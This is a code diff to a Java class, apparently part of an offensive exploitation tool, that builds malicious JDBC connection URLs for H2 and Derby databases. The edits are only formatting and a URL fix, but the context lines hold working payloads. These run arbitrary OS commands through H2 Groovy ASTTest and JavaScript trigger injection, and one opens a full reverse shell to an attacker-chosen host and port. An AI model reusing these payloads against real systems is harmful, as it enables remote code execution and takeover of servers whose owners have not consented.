@@ -133,7 +133,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [Groovy] [Command] Cmd: " + cmd);
 
         String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -147,7 +147,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [JavaScript] [Command] Cmd: " + cmd);
 
         String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -161,7 +161,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2] [JavaScript] [ReverseShell] Host: " + host + " Port: " + port);
 
         String javascript = "//javascript\nvar shell=java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")?\"cmd\":\"sh\"\\;var p=new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start()\\;var s=new java.net.Socket(\"" + host + "\"," + port + ")\\;var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\\;var po=p.getOutputStream(),so=s.getOutputStream()\\;while(!s.isClosed()){while(pi.available()>0){so.write(pi.read())\\;}while(pe.available()>0){so.write(pe.read())\\;}while(si.available()>0){po.write(si.read())\\;}so.flush()\\;po.flush()\\;java.lang.Thread.sleep(50)\\;try{p.exitValue()\\;break\\;}catch(e){}}p.destroy()\\;s.close()\\;";
-        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";
+        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '" + javascript + "'";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -200,7 +200,7 @@ public abstract class DatabaseController implements Controller {
     public Properties derbySlave(String host, String port, String database) {
         System.out.println("[Derby] [Slave] Host: " + host + " Port: " + port + " Database: " + database);
 
-        String url = "jdbc:derby:memory" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;
+        String url = "jdbc:derby:memory:" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
